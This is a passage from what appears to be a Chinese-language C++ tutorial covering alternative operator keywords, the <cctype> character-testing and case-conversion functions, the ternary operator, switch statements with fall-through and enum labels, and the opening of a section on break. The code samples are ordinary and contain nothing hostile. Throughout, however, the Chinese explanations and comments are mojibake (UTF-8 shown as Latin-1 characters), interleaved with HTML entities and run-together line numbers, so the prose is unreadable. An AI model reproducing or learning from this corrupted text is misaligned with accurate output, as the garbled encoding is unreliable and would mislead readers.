&lt;&lt; std::endl; &#125; if (not flag) &#123; // ç­‰ä»·äº !flag std::cout &lt;&lt; &quot;Condition (not) is true.&quot; &lt;&lt; std::endl; &#125; if (x not_eq y) &#123; // ç­‰ä»·äº x != y std::cout &lt;&lt; &quot;Condition (not_eq) is true.&quot; &lt;&lt; std::endl; &#125; return 0;&#125; è™½ç„¶è¿™äº›æ›¿ä»£è¡¨ç¤ºæ˜¯åˆæ³•çš„ C++ï¼Œä½†åœ¨ç°ä»£ç¼–ç¨‹å®è·µä¸­ï¼Œç›´æ¥ä½¿ç”¨ç¬¦å·è¿ç®—ç¬¦ (&amp;&amp;, ||, !) æ›´ä¸ºå¸¸è§å’Œæ™®éæ¥å—ã€‚é™¤éæœ‰ç‰¹å®šçš„ç¼–ç æ ‡å‡†æˆ–ç¯å¢ƒé™åˆ¶è¦æ±‚ä½¿ç”¨æ›¿ä»£è¡¨ç¤ºï¼Œå¦åˆ™é€šå¸¸åšæŒä½¿ç”¨ç¬¦å·è¿ç®—ç¬¦ã€‚ 6.3 å­—ç¬¦å‡½æ•°åº“cctypeC++ ç»§æ‰¿äº† C è¯­è¨€çš„ä¸€ä¸ªéå¸¸æœ‰ç”¨çš„å‡½æ•°åº“ï¼Œç”¨äºå¤„ç†å­—ç¬¦ã€‚è¿™ä¸ªåº“çš„ C++ å¤´æ–‡ä»¶æ˜¯ &lt;cctype&gt;ï¼Œå¯¹åº”çš„ C å¤´æ–‡ä»¶æ˜¯ &lt;ctype.h&gt;ã€‚å®ƒæä¾›äº†ä¸€ç³»åˆ—å‡½æ•°ï¼Œå¯ä»¥æ–¹ä¾¿åœ°æ£€æŸ¥å­—ç¬¦çš„ç±»åˆ«ï¼ˆä¾‹å¦‚ï¼Œæ˜¯å¦æ˜¯å­—æ¯ã€æ•°å­—ã€æ ‡ç‚¹ç¬¦å·ã€ç©ºç™½ç­‰ï¼‰ä»¥åŠè½¬æ¢å­—ç¬¦çš„å¤§å°å†™ã€‚ è¿™äº›å‡½æ•°é€šå¸¸æ¥æ”¶ä¸€ä¸ª int ç±»å‹çš„å‚æ•°ï¼ˆè¯¥å‚æ•°å€¼åº”èƒ½è¡¨ç¤ºä¸º unsigned char æˆ–ç­‰äº EOFï¼‰ï¼Œå¹¶è¿”å›ä¸€ä¸ª int å€¼ã€‚å¯¹äºæµ‹è¯•å‡½æ•°ï¼Œè¿”å›éé›¶å€¼ï¼ˆé€šå¸¸è§£é‡Šä¸º trueï¼‰è¡¨ç¤ºæ¡ä»¶æ»¡è¶³ï¼Œè¿”å›é›¶å€¼ï¼ˆè§£é‡Šä¸º falseï¼‰è¡¨ç¤ºæ¡ä»¶ä¸æ»¡è¶³ã€‚å¯¹äºè½¬æ¢å‡½æ•°ï¼Œè¿”å›è½¬æ¢åçš„å­—ç¬¦çš„æ•´æ•°è¡¨ç¤ºã€‚ åŒ…å«å¤´æ–‡ä»¶: è¦ä½¿ç”¨è¿™äº›å‡½æ•°ï¼Œéœ€è¦åŒ…å« &lt;cctype&gt; å¤´æ–‡ä»¶ï¼š 1#include &lt;cctype&gt; å¸¸ç”¨çš„å­—ç¬¦æµ‹è¯•å‡½æ•°: å‡½æ•°å æè¿° isalnum(ch) å¦‚æœ ch æ˜¯å­—æ¯ï¼ˆisalphaï¼‰æˆ–æ•°å­—ï¼ˆisdigitï¼‰ï¼Œè¿”å› trueã€‚ isalpha(ch) å¦‚æœ ch æ˜¯å­—æ¯ï¼ˆå¤§å†™æˆ–å°å†™ï¼‰ï¼Œè¿”å› trueã€‚ isblank(ch) (C++11) å¦‚æœ ch æ˜¯æ ‡å‡†ç©ºç™½å­—ç¬¦ï¼ˆé€šå¸¸æ˜¯ç©ºæ ¼æˆ–æ°´å¹³åˆ¶è¡¨ç¬¦ \\tï¼‰ï¼Œè¿”å› trueã€‚ iscntrl(ch) å¦‚æœ ch æ˜¯æ§åˆ¶å­—ç¬¦ï¼ˆä¾‹å¦‚ \\n, \\t, ASCII 0-31 å’Œ 127ï¼‰ï¼Œè¿”å› trueã€‚ isdigit(ch) å¦‚æœ ch æ˜¯åè¿›åˆ¶æ•°å­—ï¼ˆâ€™0â€™ åˆ° â€˜9â€™ï¼‰ï¼Œè¿”å› trueã€‚ isgraph(ch) å¦‚æœ ch æ˜¯é™¤ç©ºæ ¼å¤–çš„ä»»ä½•å¯æ‰“å°å­—ç¬¦ï¼Œè¿”å› trueã€‚ islower(ch) å¦‚æœ ch æ˜¯å°å†™å­—æ¯ï¼Œè¿”å› trueã€‚ isprint(ch) å¦‚æœ ch æ˜¯ä»»ä½•å¯æ‰“å°å­—ç¬¦ï¼ˆåŒ…æ‹¬ç©ºæ ¼ï¼‰ï¼Œè¿”å› trueã€‚ ispunct(ch) å¦‚æœ ch æ˜¯æ ‡ç‚¹ç¬¦å·ï¼ˆisgraph ä¸º true ä½† isalnum ä¸º falseï¼‰ï¼Œè¿”å› trueã€‚ isspace(ch) å¦‚æœ ch æ˜¯æ ‡å‡†ç©ºç™½å­—ç¬¦ï¼ˆç©ºæ ¼ã€æ¢é¡µ \\fã€æ¢è¡Œ \\nã€å›è½¦ \\rã€æ°´å¹³åˆ¶è¡¨ç¬¦ \\tã€å‚ç›´åˆ¶è¡¨ç¬¦ \\vï¼‰ï¼Œè¿”å› trueã€‚ isupper(ch) å¦‚æœ ch æ˜¯å¤§å†™å­—æ¯ï¼Œè¿”å› trueã€‚ isxdigit(ch) å¦‚æœ ch æ˜¯åå…­è¿›åˆ¶æ•°å­—ï¼ˆâ€™0â€™-â€˜9â€™, â€˜aâ€™-â€˜fâ€™, â€˜Aâ€™-â€˜Fâ€™ï¼‰ï¼Œè¿”å› trueã€‚ ç”¨æ³•ä¸ç¤ºä¾‹ (æµ‹è¯•å‡½æ•°): 123456789101112131415161718192021222324252627282930313233343536373839404142434445#include &lt;iostream&gt;#include &lt;cctype&gt;#include &lt;string&gt;int main() &#123; std::string text = &quot;Hello World! 123\\t&quot;; int alpha_count = 0; int digit_count = 0; int punct_count = 0; int space_count = 0; std::cout &lt;&lt; &quot;Analyzing text: \\&quot;&quot; &lt;&lt; text &lt;&lt; &quot;\\&quot;&quot; &lt;&lt; std::endl; for (char ch : text) &#123; if (isalpha(ch)) &#123; alpha_count++; if (isupper(ch)) &#123; std::cout &lt;&lt; &quot;&#x27;&quot; &lt;&lt; ch &lt;&lt; &quot;&#x27; is uppercase alpha.&quot; &lt;&lt; std::endl; &#125; else &#123; // islower(ch) std::cout &lt;&lt; &quot;&#x27;&quot; &lt;&lt; ch &lt;&lt; &quot;&#x27; is lowercase alpha.&quot; &lt;&lt; std::endl; &#125; &#125; else if (isdigit(ch)) &#123; digit_count++; std::cout &lt;&lt; &quot;&#x27;&quot; &lt;&lt; ch &lt;&lt; &quot;&#x27; is a digit.&quot; &lt;&lt; std::endl; &#125; else if (ispunct(ch)) &#123; punct_count++; std::cout &lt;&lt; &quot;&#x27;&quot; &lt;&lt; ch &lt;&lt; &quot;&#x27; is punctuation.&quot; &lt;&lt; std::endl; &#125; else if (isspace(ch)) &#123; space_count++; std::cout &lt;&lt; &quot;&#x27;&quot; &lt;&lt; ch &lt;&lt; &quot;&#x27; (ASCII &quot; &lt;&lt; int(ch) &lt;&lt; &quot;) is whitespace.&quot; &lt;&lt; std::endl; &#125; else if (iscntrl(ch)) &#123; std::cout &lt;&lt; &quot;&#x27;&quot; &lt;&lt; ch &lt;&lt; &quot;&#x27; (ASCII &quot; &lt;&lt; int(ch) &lt;&lt; &quot;) is a control character.&quot; &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;&#x27;&quot; &lt;&lt; ch &lt;&lt; &quot;&#x27; is something else.&quot; &lt;&lt; std::endl; &#125; &#125; std::cout &lt;&lt; &quot;\\nSummary:&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot; Alphabetic: &quot; &lt;&lt; alpha_count &lt;&lt; std::endl; std::cout &lt;&lt; &quot; Digits: &quot; &lt;&lt; digit_count &lt;&lt; std::endl; std::cout &lt;&lt; &quot; Punctuation: &quot; &lt;&lt; punct_count &lt;&lt; std::endl; std::cout &lt;&lt; &quot; Whitespace: &quot; &lt;&lt; space_count &lt;&lt; std::endl; return 0;&#125; å¸¸ç”¨çš„å­—ç¬¦è½¬æ¢å‡½æ•°: å‡½æ•°å æè¿° tolower(ch) å¦‚æœ ch æ˜¯å¤§å†™å­—æ¯ï¼Œè¿”å›å…¶å¯¹åº”çš„å°å†™å­—æ¯ï¼›å¦åˆ™ï¼Œè¿”å› ch ä¸å˜ã€‚ toupper(ch) å¦‚æœ ch æ˜¯å°å†™å­—æ¯ï¼Œè¿”å›å…¶å¯¹åº”çš„å¤§å†™å­—æ¯ï¼›å¦åˆ™ï¼Œè¿”å› ch ä¸å˜ã€‚ ç”¨æ³•ä¸ç¤ºä¾‹ (è½¬æ¢å‡½æ•°): 12345678910111213141516171819202122232425262728293031323334#include &lt;iostream&gt;#include &lt;cctype&gt;#include &lt;string&gt;int main() &#123; std::string message = &quot;CONVERT This Message.&quot;; std::string lower_message = &quot;&quot;; std::string upper_message = &quot;&quot;; // è½¬æ¢ä¸ºå°å†™ for (char ch : message) &#123; lower_message += tolower(ch); // å°†æ¯ä¸ªå­—ç¬¦è½¬æ¢ä¸ºå°å†™å¹¶é™„åŠ  &#125; std::cout &lt;&lt; &quot;Original: &quot; &lt;&lt; message &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Lowercase: &quot; &lt;&lt; lower_message &lt;&lt; std::endl; // è½¬æ¢ä¸ºå¤§å†™ for (char ch : message) &#123; upper_message += toupper(ch); // å°†æ¯ä¸ªå­—ç¬¦è½¬æ¢ä¸ºå¤§å†™å¹¶é™„åŠ  &#125; std::cout &lt;&lt; &quot;Uppercase: &quot; &lt;&lt; upper_message &lt;&lt; std::endl; // ç¤ºä¾‹ï¼šä¸åŒºåˆ†å¤§å°å†™çš„æ¯”è¾ƒ char response; std::cout &lt;&lt; &quot;\\nDo you want to continue? (Y/N): &quot;; std::cin &gt;&gt; response; if (tolower(response) == &#x27;y&#x27;) &#123; // å°†è¾“å…¥è½¬æ¢ä¸ºå°å†™å†æ¯”è¾ƒ std::cout &lt;&lt; &quot;Continuing...&quot; &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;Exiting...&quot; &lt;&lt; std::endl; &#125; return 0;&#125; &lt;cctype&gt; åº“æä¾›äº†ä¸€å¥—æ ‡å‡†ã€å¯ç§»æ¤çš„å‡½æ•°æ¥å¤„ç†å­—ç¬¦åˆ†ç±»å’Œè½¬æ¢ï¼Œè¿™åœ¨å¤„ç†ç”¨æˆ·è¾“å…¥ã€è§£ææ–‡æœ¬æˆ–è¿›è¡Œä¸åŒºåˆ†å¤§å°å†™çš„æ“ä½œæ—¶éå¸¸æœ‰ç”¨ã€‚ 6.4 ä¸‰å…ƒè¿ç®—ç¬¦C++ æä¾›äº†ä¸€ä¸ªç®€æ´çš„æ¡ä»¶è¿ç®—ç¬¦ï¼Œç§°ä¸ºä¸‰å…ƒè¿ç®—ç¬¦ï¼ˆæˆ–æ¡ä»¶è¿ç®—ç¬¦ï¼‰ï¼Œå®ƒæ˜¯ C++ ä¸­å”¯ä¸€ä¸€ä¸ªéœ€è¦ä¸‰ä¸ªæ“ä½œæ•°çš„è¿ç®—ç¬¦ã€‚å®ƒé€šå¸¸ç”¨äºæ ¹æ®æ¡ä»¶å°†ä¸¤ä¸ªå€¼ä¸­çš„ä¸€ä¸ªèµ‹ç»™å˜é‡ã€‚ ç”¨æ³•ä¸‰å…ƒè¿ç®—ç¬¦çš„è¯­æ³•å¦‚ä¸‹ï¼š 1condition ? expression1 : expression2; å…¶å·¥ä½œæ–¹å¼æ˜¯ï¼š é¦–å…ˆè®¡ç®— conditionã€‚ å¦‚æœ condition ä¸º trueï¼ˆéé›¶ï¼‰ï¼Œåˆ™è®¡ç®— expression1ï¼Œå¹¶ä¸”æ•´ä¸ªè¡¨è¾¾å¼çš„å€¼å°±æ˜¯ expression1 çš„å€¼ã€‚ å¦‚æœ condition ä¸º falseï¼ˆé›¶ï¼‰ï¼Œåˆ™è®¡ç®— expression2ï¼Œå¹¶ä¸”æ•´ä¸ªè¡¨è¾¾å¼çš„å€¼å°±æ˜¯ expression2 çš„å€¼ã€‚ ä¸‰å…ƒè¿ç®—ç¬¦é€šå¸¸å¯ä»¥æ›¿ä»£ç®€å•çš„ if else è¯­å¥ï¼Œä½¿ä»£ç æ›´ç´§å‡‘ã€‚ ç¤ºä¾‹ä»£ç ä¸‹é¢æ˜¯ä¸€ä¸ªä½¿ç”¨ä¸‰å…ƒè¿ç®—ç¬¦æŸ¥æ‰¾ä¸¤ä¸ªæ•°ä¸­è¾ƒå¤§å€¼çš„ç¤ºä¾‹ï¼š 1234567891011121314151617181920#include &lt;iostream&gt;int main() &#123; int a = 10; int b = 20; int max_val; // ä½¿ç”¨ä¸‰å…ƒè¿ç®—ç¬¦æ‰¾å‡º a å’Œ b ä¸­çš„è¾ƒå¤§å€¼ max_val = (a &gt; b) ? a : b; std::cout &lt;&lt; &quot;The maximum value between &quot; &lt;&lt; a &lt;&lt; &quot; and &quot; &lt;&lt; b &lt;&lt; &quot; is: &quot; &lt;&lt; max_val &lt;&lt; std::endl; // è¾“å‡º: The maximum value between 10 and 20 is: 20 // å¦ä¸€ä¸ªä¾‹å­ï¼šæ ¹æ®å¹´é¾„åˆ¤æ–­æ˜¯å¦æˆå¹´ int age = 15; std::string status = (age &gt;= 18) ? &quot;Adult&quot; : &quot;Minor&quot;; std::cout &lt;&lt; &quot;Age: &quot; &lt;&lt; age &lt;&lt; &quot;, Status: &quot; &lt;&lt; status &lt;&lt; std::endl; // è¾“å‡º: Age: 15, Status: Minor return 0;&#125; ä»£ç è§£é‡Š: åœ¨ç¬¬ä¸€ä¸ªç¤ºä¾‹ä¸­ï¼Œæ¡ä»¶ (a &gt; b) è¢«è¯„ä¼°ã€‚å› ä¸º 10 &gt; 20 æ˜¯ falseï¼Œæ‰€ä»¥è®¡ç®—ç¬¬äºŒä¸ªè¡¨è¾¾å¼ bï¼Œå¹¶å°† b çš„å€¼ï¼ˆå³ 20ï¼‰èµ‹ç»™ max_valã€‚ åœ¨ç¬¬äºŒä¸ªç¤ºä¾‹ä¸­ï¼Œæ¡ä»¶ (age &gt;= 18) è¢«è¯„ä¼°ã€‚å› ä¸º 15 &gt;= 18 æ˜¯ falseï¼Œæ‰€ä»¥è®¡ç®—ç¬¬äºŒä¸ªè¡¨è¾¾å¼ &quot;Minor&quot;ï¼Œå¹¶å°†è¿™ä¸ªå­—ç¬¦ä¸²èµ‹ç»™ statusã€‚ ä¼˜ç‚¹: ç®€æ´æ€§: å¯ä»¥ç”¨ä¸€è¡Œä»£ç æ›¿ä»£å¤šè¡Œçš„ if else ç»“æ„ï¼Œä½¿ä»£ç æ›´ç´§å‡‘ã€‚ ç¼ºç‚¹: å¯è¯»æ€§: å¯¹äºå¤æ‚çš„æ¡ä»¶æˆ–è¡¨è¾¾å¼ï¼Œä½¿ç”¨ä¸‰å…ƒè¿ç®—ç¬¦å¯èƒ½ä¼šé™ä½ä»£ç çš„å¯è¯»æ€§ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä½¿ç”¨ if else è¯­å¥é€šå¸¸æ›´å¥½ã€‚ ä¸‰å…ƒè¿ç®—ç¬¦æ˜¯ C++ ä¸­ä¸€ä¸ªæ–¹ä¾¿çš„å·¥å…·ï¼Œå°¤å…¶é€‚ç”¨äºç®€å•çš„æ¡ä»¶èµ‹å€¼ã€‚ 6.5 switch è¯­å¥switch è¯­å¥æ˜¯ C++ ä¸­å¦ä¸€ç§ç”¨äºæ§åˆ¶ç¨‹åºæµç¨‹çš„åˆ†æ”¯ç»“æ„ã€‚å®ƒå…è®¸ç¨‹åºæ ¹æ®ä¸€ä¸ªè¡¨è¾¾å¼çš„å€¼ä»å¤šä¸ªä»£ç å—ä¸­é€‰æ‹©ä¸€ä¸ªæ¥æ‰§è¡Œã€‚switch è¯­å¥é€šå¸¸ç”¨äºæ›¿ä»£å†—é•¿çš„ if else if else ç»“æ„ï¼Œç‰¹åˆ«æ˜¯å½“åˆ¤æ–­æ¡ä»¶åŸºäºå•ä¸ªå˜é‡æˆ–è¡¨è¾¾å¼çš„ç¦»æ•£å€¼æ—¶ã€‚ ç”¨æ³•switch è¯­å¥çš„åŸºæœ¬è¯­æ³•å¦‚ä¸‹ï¼š 123456789101112switch (expression) &#123; case constant_expression_1: // code block to be executed if expression equals constant_expression_1 break; // å¯é€‰ï¼Œä½†é€šå¸¸éœ€è¦ case constant_expression_2: // code block to be executed if expression equals constant_expression_2 break; // å¯é€‰ // ... å¯ä»¥æœ‰æ›´å¤šçš„ case default: // å¯é€‰ // code block to be executed if expression doesn&#x27;t match any case break; // å¯é€‰&#125; å·¥ä½œæ–¹å¼: é¦–å…ˆè®¡ç®— switch æ‹¬å·å†…çš„ expressionï¼ˆè¡¨è¾¾å¼ï¼‰ã€‚è¿™ä¸ªè¡¨è¾¾å¼å¿…é¡»å¾—å‡ºä¸€ä¸ªæ•´æ•°ç±»å‹ï¼ˆå¦‚ int, char, enumï¼‰æˆ–å¯ä»¥éšå¼è½¬æ¢ä¸ºæ•´æ•°ç±»å‹çš„å€¼ã€‚ ç¨‹åºå°† expression çš„å€¼ä¸æ¯ä¸ª case åé¢è·Ÿç€çš„ constant_expressionï¼ˆå¸¸é‡è¡¨è¾¾å¼ï¼‰è¿›è¡Œæ¯”è¾ƒã€‚ å¦‚æœæ‰¾åˆ°åŒ¹é…çš„ caseï¼Œåˆ™æ‰§è¡Œè¯¥ case æ ‡ç­¾ä¸‹çš„ä»£ç å—ã€‚ break è¯­å¥çš„ä½œç”¨æ˜¯è·³å‡º switch ç»“æ„ã€‚å¦‚æœæ²¡æœ‰ breakï¼Œç¨‹åºä¼šç»§ç»­æ‰§è¡Œä¸‹ä¸€ä¸ª case çš„ä»£ç å—ï¼ˆç§°ä¸ºâ€œè´¯ç©¿â€ï¼‰ï¼Œç›´åˆ°é‡åˆ° break æˆ– switch è¯­å¥ç»“æŸã€‚ default æ ‡ç­¾æ˜¯å¯é€‰çš„ã€‚å¦‚æœ expression çš„å€¼ä¸æ‰€æœ‰ case çš„å¸¸é‡è¡¨è¾¾å¼éƒ½ä¸åŒ¹é…ï¼Œåˆ™æ‰§è¡Œ default æ ‡ç­¾ä¸‹çš„ä»£ç å—ã€‚å¦‚æœæ²¡æœ‰ default æ ‡ç­¾ä¸”æ²¡æœ‰åŒ¹é…çš„ caseï¼Œåˆ™ switch è¯­å¥ä¸æ‰§è¡Œä»»ä½•æ“ä½œã€‚ é‡è¦é™åˆ¶: case æ ‡ç­¾åé¢çš„å€¼å¿…é¡»æ˜¯å¸¸é‡è¡¨è¾¾å¼ï¼ˆå¦‚å­—é¢å€¼ 10ã€&#39;A&#39; æˆ– const æ•´æ•°å˜é‡ï¼Œæˆ–è€…æšä¸¾é‡ï¼‰ã€‚ä¸èƒ½æ˜¯å˜é‡æˆ–éå¸¸é‡è¡¨è¾¾å¼ã€‚ expression çš„ç»“æœå¿…é¡»æ˜¯æ•´æ•°ç±»å‹ï¼ˆint, char, short, long, long long, bool, enum ç­‰ï¼‰ã€‚ä¸èƒ½æ˜¯æµ®ç‚¹æ•° (float, double) æˆ–å­—ç¬¦ä¸² (std::string)ã€‚ ç¤ºä¾‹ä»£ç 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#include &lt;iostream&gt;int main() &#123; int choice; std::cout &lt;&lt; &quot;Enter a number (1-3): &quot;; std::cin &gt;&gt; choice; switch (choice) &#123; case 1: std::cout &lt;&lt; &quot;You chose option 1.&quot; &lt;&lt; std::endl; break; // è·³å‡º switch case 2: std::cout &lt;&lt; &quot;You chose option 2.&quot; &lt;&lt; std::endl; break; // è·³å‡º switch case 3: std::cout &lt;&lt; &quot;You chose option 3.&quot; &lt;&lt; std::endl; break; // è·³å‡º switch default: std::cout &lt;&lt; &quot;Invalid choice.&quot; &lt;&lt; std::endl; // default åé¢é€šå¸¸ä¹Ÿæ”¾ breakï¼Œè™½ç„¶åœ¨è¿™é‡Œä¸æ˜¯å¿…éœ€çš„ï¼Œä½†ä¿æŒä¸€è‡´æ€§æ˜¯å¥½ä¹ æƒ¯ break; &#125; // æ¼”ç¤ºæ²¡æœ‰ break çš„æƒ…å†µ (è´¯ç©¿) char grade = &#x27;B&#x27;; std::cout &lt;&lt; &quot;\\nGrade example (fall-through):&quot; &lt;&lt; std::endl; switch (grade) &#123; case &#x27;A&#x27;: std::cout &lt;&lt; &quot;Excellent! &quot;; // æ²¡æœ‰ break case &#x27;B&#x27;: std::cout &lt;&lt; &quot;Good! &quot;; // æ²¡æœ‰ break case &#x27;C&#x27;: std::cout &lt;&lt; &quot;Passing. &quot;; break; // åœ¨è¿™é‡Œè·³å‡º case &#x27;D&#x27;: case &#x27;F&#x27;: // å¯ä»¥å°†å¤šä¸ª case å…³è”åˆ°åŒä¸€ä»£ç å— std::cout &lt;&lt; &quot;Needs improvement. &quot;; break; default: std::cout &lt;&lt; &quot;Invalid grade. &quot;; break; &#125; std::cout &lt;&lt; std::endl; // è¾“å‡º: Good! Passing. return 0;&#125; ä»£ç è§£é‡Š: ç¬¬ä¸€ä¸ª switch æ ¹æ®ç”¨æˆ·è¾“å…¥çš„ choice å€¼æ‰§è¡Œç›¸åº”çš„ caseã€‚break è¯­å¥ç¡®ä¿åªæ‰§è¡ŒåŒ¹é… case çš„ä»£ç ã€‚å¦‚æœè¾“å…¥ä¸æ˜¯ 1ã€2 æˆ– 3ï¼Œåˆ™æ‰§è¡Œ default éƒ¨åˆ†ã€‚ ç¬¬äºŒä¸ª switch æ¼”ç¤ºäº†â€œè´¯ç©¿â€è¡Œä¸ºã€‚å› ä¸º case &#39;A&#39; å’Œ case &#39;B&#39; åé¢æ²¡æœ‰ breakï¼Œå½“ grade ä¸º &#39;B&#39; æ—¶ï¼Œç¨‹åºä¼šæ‰§è¡Œ case &#39;B&#39; çš„ä»£ç  (std::cout &lt;&lt; &quot;Good! &quot;;)ï¼Œç„¶åç»§ç»­æ‰§è¡Œ case &#39;C&#39; çš„ä»£ç  (std::cout &lt;&lt; &quot;Passing. &quot;;)ï¼Œç›´åˆ°é‡åˆ° case &#39;C&#39; ä¸­çš„ break æ‰è·³å‡º switchã€‚åŒæ—¶ï¼Œå®ƒä¹Ÿå±•ç¤ºäº†å¦‚ä½•å°†å¤šä¸ª caseï¼ˆ&#39;D&#39; å’Œ &#39;F&#39;ï¼‰å…³è”åˆ°åŒä¸€ä¸ªä»£ç å—ã€‚ 6.5.1 å°†æšä¸¾é‡ç”¨ä½œæ ‡ç­¾æšä¸¾ (enum) ç±»å‹çš„å€¼æ˜¯æ•´æ•°å¸¸é‡ï¼Œå› æ­¤éå¸¸é€‚åˆç”¨ä½œ switch è¯­å¥çš„ case æ ‡ç­¾ï¼Œè¿™å¯ä»¥æé«˜ä»£ç çš„å¯è¯»æ€§ã€‚ 123456789101112131415161718192021222324252627#include &lt;iostream&gt;// å®šä¹‰ä¸€ä¸ªæšä¸¾ç±»å‹è¡¨ç¤ºé¢œè‰²enum Color &#123; RED, GREEN, BLUE, YELLOW &#125;;int main() &#123; Color selectedColor = GREEN; switch (selectedColor) &#123; case RED: std::cout &lt;&lt; &quot;The color is Red.&quot; &lt;&lt; std::endl; break; case GREEN: std::cout &lt;&lt; &quot;The color is Green.&quot; &lt;&lt; std::endl; // è¿™å°†è¢«æ‰§è¡Œ break; case BLUE: std::cout &lt;&lt; &quot;The color is Blue.&quot; &lt;&lt; std::endl; break; // æ³¨æ„ï¼šå¦‚æœ case è¦†ç›–äº†æ‰€æœ‰æšä¸¾é‡ï¼Œå¯ä»¥çœç•¥ defaultï¼Œ // ä½†å¦‚æœæšä¸¾å¯èƒ½æ‰©å±•ï¼Œæˆ–è€…ä½ æƒ³å¤„ç†æ— æ•ˆå€¼ï¼Œæœ€å¥½åŠ ä¸Š defaultã€‚ default: std::cout &lt;&lt; &quot;Unknown color.&quot; &lt;&lt; std::endl; break; &#125; return 0;&#125; ä½¿ç”¨æšä¸¾é‡ä½œä¸º case æ ‡ç­¾æ¯”ç›´æ¥ä½¿ç”¨é­”æ³•æ•°å­—ï¼ˆå¦‚ 0, 1, 2ï¼‰æ›´æ¸…æ™°æ˜“æ‡‚ã€‚ 6.5.2 switch å’Œ if elseswitch è¯­å¥å¯ä»¥çœ‹ä½œæ˜¯ç‰¹å®šç±»å‹çš„ if else if else ç»“æ„çš„æ›¿ä»£å“ï¼Œå³åˆ¤æ–­æ¡ä»¶éƒ½åŸºäºåŒä¸€ä¸ªæ•´æ•°è¡¨è¾¾å¼çš„å€¼ã€‚ ä½•æ—¶ä½¿ç”¨ switch: å½“éœ€è¦æ ¹æ®å•ä¸ªæ•´æ•°è¡¨è¾¾å¼çš„å¤šä¸ªç‰¹å®šç¦»æ•£å€¼è¿›è¡Œåˆ†æ”¯æ—¶ã€‚ å½“åˆ†æ”¯é€»è¾‘æ¸…æ™°ï¼Œå¯ä»¥æé«˜å¯è¯»æ€§æ—¶ã€‚ ä½•æ—¶ä½¿ç”¨ if else if else: å½“åˆ¤æ–­æ¡ä»¶æ¶‰åŠèŒƒå›´ï¼ˆä¾‹å¦‚ age &gt; 18 &amp;&amp; age &lt; 60ï¼‰æ—¶ã€‚ å½“åˆ¤æ–­æ¡ä»¶æ¶‰åŠæµ®ç‚¹æ•°æˆ–å­—ç¬¦ä¸²æ¯”è¾ƒæ—¶ã€‚ å½“åˆ¤æ–­æ¡ä»¶æ¯”è¾ƒå¤æ‚ï¼Œæ¶‰åŠå¤šä¸ªä¸åŒå˜é‡æˆ–é€»è¾‘è¿ç®—æ—¶ã€‚ å½“åªæœ‰ä¸€ä¸ªæˆ–ä¸¤ä¸ªåˆ†æ”¯æ—¶ï¼Œif else å¯èƒ½æ›´ç®€æ´ã€‚ ç¤ºä¾‹æ¯”è¾ƒ: 123456789101112131415161718192021222324252627// ä½¿ç”¨ if else ifint num = 2;if (num == 1) &#123; std::cout &lt;&lt; &quot;One&quot; &lt;&lt; std::endl;&#125; else if (num == 2) &#123; std::cout &lt;&lt; &quot;Two&quot; &lt;&lt; std::endl; // æ‰§è¡Œ&#125; else if (num == 3) &#123; std::cout &lt;&lt; &quot;Three&quot; &lt;&lt; std::endl;&#125; else &#123; std::cout &lt;&lt; &quot;Other&quot; &lt;&lt; std::endl;&#125;// ä½¿ç”¨ switch (ç­‰æ•ˆ)switch (num) &#123; case 1: std::cout &lt;&lt; &quot;One&quot; &lt;&lt; std::endl; break; case 2: std::cout &lt;&lt; &quot;Two&quot; &lt;&lt; std::endl; // æ‰§è¡Œ break; case 3: std::cout &lt;&lt; &quot;Three&quot; &lt;&lt; std::endl; break; default: std::cout &lt;&lt; &quot;Other&quot; &lt;&lt; std::endl; break;&#125; å¯¹äºè¿™ç§åŸºäºå•ä¸ªæ•´æ•°å€¼çš„å¤šè·¯åˆ†æ”¯ï¼Œswitch é€šå¸¸è¢«è®¤ä¸ºæ›´æ¸…æ™°ã€æœ‰æ—¶æ•ˆç‡ä¹Ÿå¯èƒ½æ›´é«˜ï¼ˆç¼–è¯‘å™¨å¯èƒ½å°†å…¶ä¼˜åŒ–ä¸ºè·³è½¬è¡¨ï¼‰ã€‚ä½†å¯¹äºæ¶‰åŠèŒƒå›´æˆ–éæ•´æ•°ç±»å‹çš„åˆ¤æ–­ï¼Œåˆ™å¿…é¡»ä½¿ç”¨ if else if ç»“æ„ã€‚ 6.6 break å’Œ continue è¯­å¥C++ æä¾›äº†ä¸¤ä¸ªç‰¹æ®Šçš„è¯­å¥ï¼Œbreak å’Œ continueï¼Œç”¨äºåœ¨å¾ªç¯ï¼ˆfor, while, do whileï¼‰æˆ– switch è¯­å¥å†…éƒ¨æ”¹å˜æ­£å¸¸çš„æ‰§è¡Œæµç¨‹ã€‚ 6.6.1 break è¯­å¥break è¯­å¥ç”¨äºç«‹å³ç»ˆæ­¢åŒ…å«å®ƒçš„æœ€å†…å±‚çš„å¾ªç¯ï¼ˆfor, while, do whileï¼‰æˆ– switch è¯­å¥çš„æ‰§è¡Œã€‚ç¨‹åºæ§åˆ¶æµä¼šè·³è½¬åˆ°è¯¥å¾ªç¯æˆ– switch è¯­å¥ä¹‹åçš„ä¸‹ä¸€æ¡è¯­å¥ã€‚ ç”¨æ³•: åœ¨å¾ªç¯ä¸­: å½“æ»¡è¶³æŸä¸ªç‰¹å®šæ¡ä»¶æ—¶ï¼Œæå‰é€€å‡ºå¾ªç¯ã€‚ åœ¨ switch è¯­å¥ä¸­: é˜²æ­¢â€œè´¯ç©¿â€ï¼ˆfall-throughï¼‰åˆ°ä¸‹ä¸€ä¸ª caseï¼Œåœ¨æ‰§è¡Œå®ŒåŒ¹é…çš„ case ä»£ç å—åè·³å‡º switch ç»“æ„ï¼ˆå¦‚ 6.5 èŠ‚æ‰€è¿°ï¼‰ã€‚ ç¤ºä¾‹ (åœ¨å¾ªç¯ä¸­ä½¿ç”¨): 123456789101112131415161718192021222324252627282930313233343536373839#include &lt;iostream&gt;int main() &#123; // æŸ¥æ‰¾æ•°ç»„ä¸­ç¬¬ä¸€ä¸ªè´Ÿæ•°çš„ä½ç½® int numbers[] = &#123;10, 5, 0, -2, 8, -5&#125;; int found_index = -1; // åˆå§‹åŒ–ä¸º -1ï¼Œè¡¨ç¤ºæœªæ‰¾åˆ° std::cout &lt;&lt; &quot;Searching for the first negative number...&quot; &lt;&lt; std::endl; for (int i = 0; i &lt; 6; ++i) &#123; std::cout &lt;&lt; &quot;Checking index &quot; &lt;&lt; i 